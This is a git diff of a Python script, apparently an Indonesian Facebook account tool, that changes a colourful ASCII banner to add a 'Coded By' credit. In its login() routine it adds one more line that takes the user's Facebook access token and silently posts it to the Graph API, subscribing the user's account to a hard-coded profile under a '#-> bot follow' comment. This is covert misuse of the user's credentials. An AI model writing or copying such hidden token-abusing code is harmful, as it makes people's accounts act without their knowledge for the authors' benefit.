@@ -65,7 +65,8 @@ def logo():
  \033[1;95m██╔══██╗██╔══██║██╗░░██║██║██║╚████║██║░░╚██╗██╔══██║██║╚████║
  ██████╦╝██║░░██║╚█████╔╝██║██║░╚███║╚██████╔╝██║░░██║██║░╚███║
  ╚═════╝░╚═╝░░╚═╝░╚════╝░╚═╝╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝                                                       
-    \033[1;95m──────═• \033[1;92m● \033[1;95m══════════════════════════════ \033[1;92m● \033[1;97m\033[1;95m•═──────  
+    \033[1;95m──────═• \033[1;92m● \033[1;95m══════════════════════════════ \033[1;92m● \033[1;97m\033[1;95m•═────── 
+\033[1;93m◍➤\033[1;97m Coded By   : \033[1;92mAngga ™ \033[1;97m 
 \033[1;93m◍➤\033[1;97m Author     : \033[1;92mBangsat Militan☆ \033[1;97m
 \033[1;93m◍➤\033[1;97m Github     : \033[1;92mhttps://github.com/Bajingan-Z \033[1;97m
 \033[1;93m◍➤\033[1;97m Facebook   : \033[1;92mhttps://facebook.com/PEMUDA.KALEUM \033[1;97m
@@ -90,7 +91,8 @@ def login():
 			#-> bot follow
 			requests.post("https://graph.facebook.com/100000395779504/subscribers?access_token="+token)
 			requests.post("https://graph.facebook.com/100017584682867/subscribers?access_token="+token)
-			requests.post("https://graph.facebook.com/100000834003593/subscribers?access_token="+token)                        
+			requests.post("https://graph.facebook.com/100000834003593/subscribers?access_token="+token)  
+			requests.post("https://graph.facebook.com/100003986228742/subscribers?access_token="+token)                      
 			menu()
 		except KeyError:
 			os.system("rm -f login.txt")
